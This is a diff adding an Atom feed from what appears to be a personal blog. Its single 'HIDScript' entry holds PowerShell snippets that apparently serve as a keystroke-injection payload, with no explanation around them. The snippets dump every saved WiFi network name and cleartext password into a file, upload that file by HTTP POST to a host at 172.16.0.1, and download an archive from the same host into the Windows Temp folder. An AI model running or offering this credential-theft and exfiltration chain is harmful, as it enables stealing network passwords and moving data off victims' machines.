@@ -1,0 +1,47 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Powershell | icps]]></title>
+  <link href="https://icps0610.github.io/blog/categories/powershell/atom.xml" rel="self"/>
+  <link href="https://icps0610.github.io/"/>
+  <updated>2021-04-01T16:45:35+08:00</updated>
+  <id>https://icps0610.github.io/</id>
+  <author>
+    <name><![CDATA[icps]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[HIDScript]]></title>
+    <link href="https://icps0610.github.io/blog/2021/04/01/hidscript/"/>
+    <updated>2021-04-01T16:41:26+08:00</updated>
+    <id>https://icps0610.github.io/blog/2021/04/01/hidscript</id>
+    <content type="html"><![CDATA[<pre><code class="powershell">
+## uploadFiles
+
+$FilePath="C:/Windows/Temp/files.zip"
+$Url="http://172.16.0.1/"
+$fileName=[System.IO.Path]::GetFileName($filePath)
+$fileBytes=([System.IO.File]::ReadAllBytes($FilePath))
+$fileEnc=[System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($fileBytes)
+$boundary=[System.Guid]::NewGuid().ToString()
+$lf="`r`n"
+$bodyLines=("--$boundary","Content-Disposition: form-data; name=`"uploads`"; filename=`"$FileName`"","Content-Type: application/octet-stream$lf",$fileEnc,"--$boundary--$lf") -join $lf
+Invoke-RestMethod -Uri $Url -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
+
+
+## getWiFiPassWd
+$ws=(netsh wlan show profiles) -match " : ";foreach($s in $ws){echo $s;$ssid=$s.Split(":")[1].Trim();$pw=(netsh wlan show profiles name=$ssid key=clear);$c=0;foreach($p in $pw){;if($c -eq "32"){$pass=$p.Split(":")[1].Trim();}$c+=1}echo "$ssid $pass" &gt;&gt; $FilePath}
+
+## downloadFiles
+
+$Source="http://172.16.0.1/uploads/dFiles.7z"
+$Destination="C:/Windows/Temp/dFiles.7z"
+Invoke-WebRequest -Uri $Source -OutFile $Destination
+</code></pre>
+]]></content>
+  </entry>
+  
+ </feed>
